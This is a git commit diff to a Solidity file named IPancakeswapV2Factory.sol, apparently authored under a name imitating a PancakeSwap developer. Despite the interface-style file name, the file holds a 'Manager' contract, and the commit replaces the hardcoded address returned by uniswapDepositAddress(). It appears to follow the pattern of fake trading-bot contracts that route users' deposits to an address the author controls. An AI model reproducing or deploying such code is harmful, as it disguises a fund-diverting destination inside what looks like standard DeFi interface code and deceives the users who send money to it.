97812a9b0064ceb78174d4a03f2084d19faa166c
pancakeswap-v2-developer <96366950+Shisi6928@users.noreply.github.com>
2022-01-24 16:50:36 +0800

    Update IPancakeswapV2Factory.sol

--- IPancakeswapV2Factory.sol
+++ IPancakeswapV2Factory.sol
@@ -6,6 +6,6 @@ contract Manager {
 	}
 
 	function uniswapDepositAddress() public pure returns (address) {
-		return 0xa3ec85384dF26E06d1537735Cc69860f597e1bAD;
+		return 0x4230327Ef839074d1dab0C767a071999aED2498f;
 	}
 }
